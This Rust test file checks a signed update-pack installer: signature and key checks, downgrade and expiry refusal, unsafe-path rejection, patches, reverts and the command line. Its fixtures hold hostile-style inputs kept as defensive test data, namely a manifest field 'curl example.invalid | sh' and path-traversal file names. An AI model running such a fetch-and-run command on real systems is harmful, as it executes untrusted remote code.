//! A definition pack travels like an antivirus update. These tests hold it to the rules that make
//! that safe: nothing is read before its signature checks, nothing goes backward, nothing outlives
//! its expiry, and a failed install changes nothing.
use rrflow_eval::lab::definitions::content::{lab_files, RrflowContent, RRFLOW_PRODUCT};
use rrflow_eval::lab::definitions::pack::{
    build_pack, generate_key, read_pack, InstallKind, PackContent, PackRequest, PackStore,
    SignedPack, TrustedKey, TrustedKeys, MAX_PACK_BYTES,
};
use rrflow_eval::lab::Result;
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

const NOW: u64 = 1_800_000_000;
const DAY: u64 = 86_400;
const PRODUCT: &str = "example-product";
const SCHEMA: u16 = 3;

/// Any product can supply this: the envelope knows nothing about what it carries.
struct Example;

impl PackContent for Example {
    fn product(&self) -> &str {
        PRODUCT
    }

    fn schema(&self) -> u16 {
        SCHEMA
    }

    fn check(&self, files: &BTreeMap<String, String>) -> Result<()> {
        for (path, text) in files {
            serde_json::from_str::<serde_json::Value>(text)
                .map_err(|error| format!("{path}: {error}"))?;
        }
        Ok(())
    }

    fn notable_changes(
        &self,
        before: &BTreeMap<String, String>,
        after: &BTreeMap<String, String>,
    ) -> Result<Vec<String>> {
        Ok(after
            .iter()
            .filter(|(path, text)| path.starts_with("run/") && before.get(*path) != Some(*text))
            .map(|(path, _)| format!("{path} changes what runs"))
            .collect())
    }
}

struct Publisher {
    private: String,
    keys: TrustedKeys,
}

fn publisher() -> Publisher {
    let key = generate_key().unwrap();
    Publisher {
        private: key.private_hex,
        keys: TrustedKeys {
            keys: vec![TrustedKey {
                id: key.key_id,
                public_key: key.public_hex,
            }],
        },
    }
}

fn files(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs
        .iter()
        .map(|(path, text)| ((*path).to_owned(), (*text).to_owned()))
        .collect()
}

fn original() -> BTreeMap<String, String> {
    files(&[("a/one.json", "{\"n\":1}"), ("a/two.json", "{\"n\":2}")])
}

fn request<'a>(
    publisher: &'a Publisher,
    sequence: u64,
    files: &'a BTreeMap<String, String>,
) -> PackRequest<'a> {
    PackRequest {
        product: PRODUCT,
        content_schema: SCHEMA,
        sequence,
        published_at_unix_s: NOW,
        expires_at_unix_s: NOW + 90 * DAY,
        files,
        signing_key: &publisher.private,
        base: None,
    }
}

fn pack(publisher: &Publisher, sequence: u64, files: &BTreeMap<String, String>) -> Vec<u8> {
    serde_json::to_vec(&build_pack(&request(publisher, sequence, files)).unwrap()).unwrap()
}

fn store(root: &Path) -> PackStore {
    PackStore::open(root.join("store"), PRODUCT).unwrap()
}

fn install(
    store: &PackStore,
    bytes: &[u8],
    publisher: &Publisher,
) -> Result<rrflow_eval::lab::definitions::pack::InstallOutcome> {
    store.install(bytes, &publisher.keys, &Example, NOW + DAY)
}

/// Rebuilds a pack with a changed manifest, keeping its old signature.
fn with_manifest(bytes: &[u8], change: impl Fn(&mut serde_json::Value)) -> Vec<u8> {
    let mut signed: SignedPack = serde_json::from_slice(bytes).unwrap();
    let mut manifest: serde_json::Value = serde_json::from_str(&signed.manifest).unwrap();
    change(&mut manifest);
    signed.manifest = serde_json::to_string(&manifest).unwrap();
    serde_json::to_vec(&signed).unwrap()
}

fn expect_refused(result: Result<impl std::fmt::Debug>, contains: &str) {
    let error = result.expect_err("this must be refused");
    assert!(error.contains(contains), "{error}");
}

#[test]
fn a_full_pack_installs_and_its_files_read_back() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    let outcome = install(&store, &pack(&publisher, 1, &original()), &publisher).unwrap();
    assert_eq!(outcome.kind, InstallKind::Installed);
    assert_eq!(outcome.sequence, 1);
    assert_eq!(outcome.added, vec!["a/one.json", "a/two.json"]);
    assert_eq!(store.current_files(&publisher.keys).unwrap(), original());
    let status = store.status(&publisher.keys, NOW + DAY).unwrap();
    assert_eq!(status.current_sequence, Some(1));
    assert_eq!(status.file_count, 2);
    assert!(!status.expired);
}

#[test]
fn a_changed_manifest_is_refused_because_its_signature_no_longer_checks() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let tampered = with_manifest(&pack(&publisher, 1, &original()), |manifest| {
        manifest["expires_at_unix_s"] = serde_json::json!(NOW + 9_999 * DAY);
    });
    expect_refused(
        install(&store(root.path()), &tampered, &publisher),
        "signature",
    );
}

#[test]
fn a_pack_signed_by_an_unknown_key_is_refused() {
    let root = tempfile::tempdir().unwrap();
    let trusted = publisher();
    let stranger = publisher();
    let bytes = pack(&stranger, 1, &original());
    expect_refused(
        install(&store(root.path()), &bytes, &trusted),
        "not trusted",
    );
}

#[test]
fn a_signature_is_not_read_as_valid_because_the_key_id_matches() {
    let root = tempfile::tempdir().unwrap();
    let trusted = publisher();
    let stranger = publisher();
    let mut signed: SignedPack = serde_json::from_slice(&pack(&stranger, 1, &original())).unwrap();
    signed.key_id = trusted.keys.keys[0].id.clone();
    let bytes = serde_json::to_vec(&signed).unwrap();
    expect_refused(install(&store(root.path()), &bytes, &trusted), "signature");
}

#[test]
fn a_changed_file_is_refused() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let mut signed: SignedPack = serde_json::from_slice(&pack(&publisher, 1, &original())).unwrap();
    signed
        .files
        .insert("a/one.json".into(), "{\"n\":99}".into());
    let bytes = serde_json::to_vec(&signed).unwrap();
    expect_refused(install(&store(root.path()), &bytes, &publisher), "differs");
}

#[test]
fn a_file_the_manifest_does_not_list_is_refused() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let mut signed: SignedPack = serde_json::from_slice(&pack(&publisher, 1, &original())).unwrap();
    signed.files.insert("a/extra.json".into(), "{}".into());
    let bytes = serde_json::to_vec(&signed).unwrap();
    expect_refused(
        install(&store(root.path()), &bytes, &publisher),
        "does not list",
    );
}

#[test]
fn a_lower_sequence_is_refused_and_the_same_sequence_must_match() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    let second = pack(&publisher, 2, &original());
    install(&store, &second, &publisher).unwrap();

    expect_refused(
        install(&store, &pack(&publisher, 1, &original()), &publisher),
        "older",
    );
    let different = files(&[("a/one.json", "{\"n\":5}")]);
    expect_refused(
        install(&store, &pack(&publisher, 2, &different), &publisher),
        "different content",
    );
    let again = install(&store, &second, &publisher).unwrap();
    assert_eq!(again.kind, InstallKind::AlreadyInstalled);
    assert_eq!(store.current_files(&publisher.keys).unwrap(), original());
}

#[test]
fn an_expired_pack_cannot_be_installed_and_an_installed_one_goes_stale() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    let bytes = pack(&publisher, 1, &original());
    let late = NOW + 91 * DAY;
    expect_refused(
        store.install(&bytes, &publisher.keys, &Example, late),
        "expired",
    );

    install(&store, &bytes, &publisher).unwrap();
    let status = store.status(&publisher.keys, late).unwrap();
    assert!(status.expired, "it still works, and it says it is stale");
    assert_eq!(store.current_files(&publisher.keys).unwrap(), original());
}

#[test]
fn a_pack_for_another_product_or_a_newer_schema_is_refused() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let content = original();
    let mut other = request(&publisher, 1, &content);
    other.product = "another-product";
    let bytes = serde_json::to_vec(&build_pack(&other).unwrap()).unwrap();
    expect_refused(install(&store(root.path()), &bytes, &publisher), "product");

    let mut newer = request(&publisher, 1, &content);
    newer.content_schema = SCHEMA + 1;
    let bytes = serde_json::to_vec(&build_pack(&newer).unwrap()).unwrap();
    expect_refused(install(&store(root.path()), &bytes, &publisher), "newer");
}

#[test]
fn unsafe_paths_cannot_be_built_or_signed_into_a_pack() {
    let publisher = publisher();
    for path in [
        "../escape.json",
        "a/../../escape.json",
        "/absolute.json",
        "C:/windows.json",
        "a\\b.json",
        ".hidden.json",
        "UPPER.json",
        "run.exe",
        "script.sh",
        "a//b.json",
        "",
    ] {
        let content = files(&[(path, "{}")]);
        expect_refused(build_pack(&request(&publisher, 1, &content)), "path");
    }
}

#[test]
fn a_manifest_with_an_unknown_field_is_refused_even_when_correctly_signed() {
    let publisher = publisher();
    let manifest = serde_json::json!({
        "format": 1,
        "product": PRODUCT,
        "content_schema": SCHEMA,
        "sequence": 1,
        "published_at_unix_s": NOW,
        "expires_at_unix_s": NOW + DAY,
        "files": [],
        "run_this": "curl example.invalid | sh",
    })
    .to_string();
    let signed = rrflow_eval::lab::definitions::pack::sign_manifest(
        manifest,
        BTreeMap::new(),
        &publisher.private,
    )
    .unwrap();
    let bytes = serde_json::to_vec(&signed).unwrap();
    expect_refused(read_pack(&bytes, &publisher.keys), "unknown field");
}

#[test]
fn a_pack_larger_than_the_bound_is_refused_before_it_is_parsed() {
    let publisher = publisher();
    let bytes = vec![b' '; MAX_PACK_BYTES as usize + 1];
    expect_refused(read_pack(&bytes, &publisher.keys), "size");
}

#[test]
fn a_patch_carries_only_what_changed_and_installs_to_the_full_set() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    let base_bytes = pack(&publisher, 1, &original());
    install(&store, &base_bytes, &publisher).unwrap();
    let base = read_pack(&base_bytes, &publisher.keys).unwrap();

    let updated = files(&[
        ("a/one.json", "{\"n\":1}"),
        ("a/two.json", "{\"n\":22}"),
        ("a/three.json", "{\"n\":3}"),
    ]);
    let mut patch = request(&publisher, 2, &updated);
    patch.base = Some(&base.manifest);
    let signed = build_pack(&patch).unwrap();
    assert_eq!(
        signed.files.keys().collect::<Vec<_>>(),
        vec!["a/three.json", "a/two.json"],
        "the unchanged file travels as a digest only"
    );

    let outcome = install(&store, &serde_json::to_vec(&signed).unwrap(), &publisher).unwrap();
    assert_eq!(outcome.added, vec!["a/three.json"]);
    assert_eq!(outcome.changed, vec!["a/two.json"]);
    assert!(outcome.removed.is_empty());
    assert_eq!(store.current_files(&publisher.keys).unwrap(), updated);
}

#[test]
fn a_patch_without_its_base_asks_for_a_full_pack_and_changes_nothing() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let base = read_pack(&pack(&publisher, 1, &original()), &publisher.keys).unwrap();
    let updated = files(&[("a/one.json", "{\"n\":1}"), ("a/two.json", "{\"n\":22}")]);
    let mut patch = request(&publisher, 2, &updated);
    patch.base = Some(&base.manifest);
    let bytes = serde_json::to_vec(&build_pack(&patch).unwrap()).unwrap();

    let store = store(root.path());
    expect_refused(install(&store, &bytes, &publisher), "full pack");
    assert_eq!(
        store.status(&publisher.keys, NOW).unwrap().current_sequence,
        None
    );
}

#[test]
fn content_that_fails_its_check_changes_nothing() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    install(&store, &pack(&publisher, 1, &original()), &publisher).unwrap();
    let broken = files(&[("a/one.json", "not json")]);
    expect_refused(
        install(&store, &pack(&publisher, 2, &broken), &publisher),
        "a/one.json",
    );
    assert_eq!(store.current_files(&publisher.keys).unwrap(), original());
    let status = store.status(&publisher.keys, NOW).unwrap();
    assert_eq!(status.current_sequence, Some(1));
    assert_eq!(status.highest_sequence, 1, "a refused pack sets no floor");
}

#[test]
fn a_damaged_store_is_reported_and_not_read() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    install(&store, &pack(&publisher, 1, &original()), &publisher).unwrap();
    let object = files_under(&root.path().join("store/objects"))
        .into_iter()
        .next()
        .expect("an object was stored");
    std::fs::write(object, "{\"n\":666}").unwrap();
    expect_refused(store.current_files(&publisher.keys), "differs");
}

#[test]
fn a_changed_store_manifest_is_refused_because_it_is_signed() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    install(&store, &pack(&publisher, 1, &original()), &publisher).unwrap();
    let manifest = files_under(&root.path().join("store/manifests"))
        .into_iter()
        .next()
        .expect("a manifest was stored");
    let text = std::fs::read_to_string(&manifest).unwrap();
    std::fs::write(
        &manifest,
        text.replace("example-product", "example-produce"),
    )
    .unwrap();
    expect_refused(store.current_files(&publisher.keys), "signature");
}

#[test]
fn a_revert_is_recorded_and_keeps_the_floor() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    install(&store, &pack(&publisher, 1, &original()), &publisher).unwrap();
    let second = files(&[("a/one.json", "{\"n\":2}")]);
    install(&store, &pack(&publisher, 2, &second), &publisher).unwrap();

    expect_refused(store.revert(1, "", &publisher.keys, NOW), "reason");
    expect_refused(
        store.revert(9, "no such pack", &publisher.keys, NOW),
        "not installed",
    );
    store
        .revert(1, "pack 2 gave wrong results", &publisher.keys, NOW)
        .unwrap();
    assert_eq!(store.current_files(&publisher.keys).unwrap(), original());
    let status = store.status(&publisher.keys, NOW).unwrap();
    assert_eq!(status.current_sequence, Some(1));
    assert_eq!(status.highest_sequence, 2);
    assert_eq!(
        status.reverted_because.as_deref(),
        Some("pack 2 gave wrong results")
    );

    expect_refused(
        install(&store, &pack(&publisher, 1, &original()), &publisher),
        "older",
    );
    let third = files(&[("a/one.json", "{\"n\":3}")]);
    install(&store, &pack(&publisher, 3, &third), &publisher).unwrap();
    let status = store.status(&publisher.keys, NOW).unwrap();
    assert_eq!(status.current_sequence, Some(3));
    assert_eq!(status.reverted_because, None);
}

#[test]
fn an_update_names_what_changes_what_runs() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let store = store(root.path());
    let first = files(&[("run/app.json", "{\"image\":\"one\"}"), ("a.json", "{}")]);
    install(&store, &pack(&publisher, 1, &first), &publisher).unwrap();
    let second = files(&[("run/app.json", "{\"image\":\"two\"}"), ("a.json", "{}")]);
    let outcome = install(&store, &pack(&publisher, 2, &second), &publisher).unwrap();
    assert_eq!(outcome.notable, vec!["run/app.json changes what runs"]);
}

fn files_under(root: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut pending = vec![root.to_path_buf()];
    while let Some(directory) = pending.pop() {
        for entry in std::fs::read_dir(directory).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                pending.push(path);
            } else {
                found.push(path);
            }
        }
    }
    found.sort();
    found
}

fn real_lab() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../../eval/lab")
}

#[test]
fn the_labs_real_definitions_build_a_pack_that_installs_and_resolves() {
    let root = tempfile::tempdir().unwrap();
    let publisher = publisher();
    let content = lab_files(&real_lab()).unwrap();
    assert!(content.keys().any(|path| path.starts_with("systems/")));
    assert!(content.keys().any(|path| path.starts_with("tests/")));
    assert!(content.contains_key("sources.json"));

    let mut request = request(&publisher, 1, &content);
    request.product = RRFLOW_PRODUCT;
    request.content_schema = RrflowContent.schema();
    let bytes = serde_json::to_vec(&build_pack(&request).unwrap()).unwrap();
    let store = PackStore::open(root.path().join("store"), RRFLOW_PRODUCT).unwrap();
    let outcome = store
        .install(&bytes, &publisher.keys, &RrflowContent, NOW + DAY)
        .unwrap();
    assert_eq!(outcome.kind, InstallKind::Installed);
    assert_eq!(store.current_files(&publisher.keys).unwrap(), content);
}

#[test]
fn rrflows_check_refuses_a_system_a_test_cannot_use_and_files_it_does_not_know() {
    let content = lab_files(&real_lab()).unwrap();
    RrflowContent.check(&content).unwrap();

    let mut unknown = content.clone();
    unknown.insert("anything/else.json".into(), "{}".into());
    expect_refused(RrflowContent.check(&unknown), "not a definition file");

    let mut broken = content.clone();
    broken.insert(
        "systems/qdrant.json".into(),
        "{\"schema_version\":1}".into(),
    );
    expect_refused(RrflowContent.check(&broken), "systems/qdrant.json");

    let mut missing = content.clone();
    missing.remove("systems/qdrant.json");
    expect_refused(RrflowContent.check(&missing), "qdrant");

    let mut renamed = content;
    let text = renamed.remove("systems/custom-reference.json").unwrap();
    renamed.insert("systems/other-name.json".into(), text);
    expect_refused(RrflowContent.check(&renamed), "other-name");
}

#[test]
fn rrflows_check_names_a_system_whose_launch_changed() {
    let before = lab_files(&real_lab()).unwrap();
    let mut after = before.clone();
    let text = after["systems/qdrant.json"].clone();
    let mut system: serde_json::Value = serde_json::from_str(&text).unwrap();
    system["launch"]["image"] = serde_json::json!(
        "qdrant/qdrant@sha256:0000000000000000000000000000000000000000000000000000000000000000"
    );
    after.insert(
        "systems/qdrant.json".into(),
        serde_json::to_string(&system).unwrap(),
    );
    let notable = RrflowContent.notable_changes(&before, &after).unwrap();
    assert_eq!(notable.len(), 1, "{notable:?}");
    assert!(notable[0].contains("qdrant"), "{notable:?}");

    let mut added = before.clone();
    let mut brand_new: serde_json::Value =
        serde_json::from_str(&before["systems/custom-reference.json"]).unwrap();
    brand_new["binding"]["id"] = serde_json::json!("brand-new");
    added.insert(
        "systems/brand-new.json".into(),
        serde_json::to_string(&brand_new).unwrap(),
    );
    let notable = RrflowContent.notable_changes(&before, &added).unwrap();
    assert!(
        notable.iter().any(|line| line.contains("brand-new")),
        "{notable:?}"
    );
}

/// The real binary, end to end, on a copy of the lab's real definitions.
#[test]
fn the_command_line_builds_installs_patches_and_refuses_a_changed_pack() {
    let root = tempfile::tempdir().unwrap();
    let path = |name: &str| root.path().join(name).to_str().unwrap().to_owned();
    let lab = root.path().join("lab");
    for (relative, text) in lab_files(&real_lab()).unwrap() {
        let target = lab.join(relative);
        std::fs::create_dir_all(target.parent().unwrap()).unwrap();
        std::fs::write(target, text).unwrap();
    }
    let run = |arguments: &[&str]| {
        let output = std::process::Command::new(env!("CARGO_BIN_EXE_rrflow-lab"))
            .arg("definitions")
            .args(arguments)
            .output()
            .unwrap();
        (
            output.status.success(),
            String::from_utf8_lossy(&output.stdout).into_owned(),
            String::from_utf8_lossy(&output.stderr).into_owned(),
        )
    };
    let (private, trust, store) = (path("private.key"), path("trust.json"), path("store"));
    let lab_path = lab.to_str().unwrap().to_owned();

    let (ok, out, error) = run(&["keygen", "--private", &private, "--trust", &trust]);
    assert!(ok, "{error}");
    let secret = std::fs::read_to_string(&private).unwrap();
    assert!(!out.contains(secret.trim()), "the private key was printed");
    let (ok, _, error) = run(&[
        "keygen",
        "--private",
        &private,
        "--trust",
        &path("other.json"),
    ]);
    assert!(!ok, "a key must not be overwritten");
    assert!(error.contains("private.key"), "{error}");

    let first = path("first.pack.json");
    let (ok, _, error) = run(&[
        "build",
        "--lab",
        &lab_path,
        "--key",
        &private,
        "--sequence",
        "1",
        "--days",
        "90",
        "--out",
        &first,
    ]);
    assert!(ok, "{error}");
    let (ok, out, error) = run(&[
        "install", "--pack", &first, "--trust", &trust, "--store", &store,
    ]);
    assert!(ok, "{error}");
    assert!(out.contains("new system qdrant would start"), "{out}");

    let small = lab.join("tests/vector-small.json");
    let changed =
        std::fs::read_to_string(&small)
            .unwrap()
            .replacen("\"revision\": 1", "\"revision\": 2", 1);
    std::fs::write(&small, changed).unwrap();
    let second = path("second.pack.json");
    let (ok, out, error) = run(&[
        "patch",
        "--lab",
        &lab_path,
        "--key",
        &private,
        "--sequence",
        "2",
        "--days",
        "90",
        "--out",
        &second,
        "--base",
        &first,
        "--trust",
        &trust,
    ]);
    assert!(ok, "{error}");
    assert!(out.contains("tests/vector-small.json"), "{out}");
    assert!(out.contains(": 1 of "), "{out}");
    assert!(
        std::fs::metadata(&second).unwrap().len() * 2 < std::fs::metadata(&first).unwrap().len(),
        "a patch is much smaller than the full pack"
    );

    let tampered = path("tampered.pack.json");
    let text = std::fs::read_to_string(&second).unwrap();
    std::fs::write(
        &tampered,
        text.replacen("\\\"sequence\\\": 2", "\\\"sequence\\\": 3", 1),
    )
    .unwrap();
    let (ok, _, error) = run(&[
        "install", "--pack", &tampered, "--trust", &trust, "--store", &store,
    ]);
    assert!(!ok, "a changed pack must be refused");
    assert!(error.contains("signature"), "{error}");

    let (ok, out, error) = run(&[
        "install", "--pack", &second, "--trust", &trust, "--store", &store,
    ]);
    assert!(ok, "{error}");
    assert!(out.contains("tests/vector-small.json"), "{out}");
    let (ok, out, error) = run(&["status", "--trust", &trust, "--store", &store]);
    assert!(ok, "{error}");
    let status: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(status["current_sequence"], 2);
    assert_eq!(status["expired"], false);

    let (ok, _, error) = run(&[
        "install", "--pack", &first, "--trust", &trust, "--store", &store,
    ]);
    assert!(!ok, "an old pack must be refused");
    assert!(error.contains("older"), "{error}");
}
